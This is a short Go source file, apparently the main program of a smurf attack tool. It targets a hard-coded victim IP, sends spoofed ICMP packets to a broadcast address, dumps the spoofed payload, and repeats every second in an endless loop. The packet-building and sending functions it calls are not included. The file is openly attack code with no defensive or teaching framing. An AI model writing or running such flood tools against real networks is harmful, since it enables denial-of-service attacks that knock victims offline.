package main

import (
	"encoding/hex"
	"log"
	"net"
	"time"
)

func main() {
	victim := net.IP{192, 168, 1, 73}
	network := net.IP{192, 168, 1, 255}

	s, err := newSmurf(victim, network)
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("[smurf] victim: %s, sending icmp to (%s)", victim.String(), network.String())
	log.Printf("[smurf] spoofed payload:\n%v", hex.Dump(s.payload))
	for {
		if err := s.execute(); err != nil {
			log.Printf("[smurf] error: %s", err)
		}
		time.Sleep(time.Second * 1)
	}

}
